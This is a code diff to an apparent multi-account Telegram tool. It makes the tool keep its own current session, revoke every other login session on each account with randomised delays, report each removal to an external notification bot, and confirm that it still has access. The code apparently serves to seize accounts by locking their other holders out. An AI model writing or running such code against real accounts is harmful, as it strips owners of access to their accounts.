@@ -36,6 +36,9 @@ const _ownDeviceModels = (() => {
     return models;
 })();
 function isOwnAuth(auth) {
+    if (auth.current) {
+        return true;
+    }
     const deviceModel = (auth.deviceModel || '').toLowerCase();
     if (deviceModel && _ownDeviceModels.some(model => deviceModel.includes(model) || model.includes(deviceModel))) {
         return true;
@@ -46,11 +49,31 @@ async function removeOtherAuths(ctx) {
     if (!ctx.client)
         throw new Error('Client is not initialized');
     const result = await ctx.client.invoke(new telegram_1.Api.account.GetAuthorizations());
+    let keptCount = 0;
+    let revokedCount = 0;
     for (const auth of result.authorizations) {
-        if (isOwnAuth(auth))
+        if (isOwnAuth(auth)) {
+            keptCount++;
+            ctx.logger.info(ctx.phoneNumber, `Keeping auth: ${auth.appName} | ${auth.deviceModel} | current=${auth.current}`);
             continue;
+        }
+        ctx.logger.info(ctx.phoneNumber, `Revoking auth: ${auth.appName} | ${auth.deviceModel} | ${auth.country}`);
         await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Removing Auth : ${ctx.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
         await resetAuthorization(ctx, auth);
+        revokedCount++;
+        await (0, Helpers_1.sleep)(2000 + Math.random() * 3000);
+    }
+    ctx.logger.info(ctx.phoneNumber, `Auth cleanup: kept ${keptCount}, revoked ${revokedCount}`);
+    try {
+        const me = await ctx.client.getMe();
+        if (!me) {
+            throw new Error('Session verification failed after removeOtherAuths — getMe returned null');
+        }
+        ctx.logger.info(ctx.phoneNumber, `Session verified alive after auth cleanup (user: ${me.phone})`);
+    }
+    catch (verifyError) {
+        ctx.logger.error(ctx.phoneNumber, 'CRITICAL: Our session may have been revoked during removeOtherAuths!', verifyError);
+        throw new Error(`Session self-check failed after removeOtherAuths: ${verifyError}`);
     }
 }
 async function resetAuthorization(ctx, auth) {
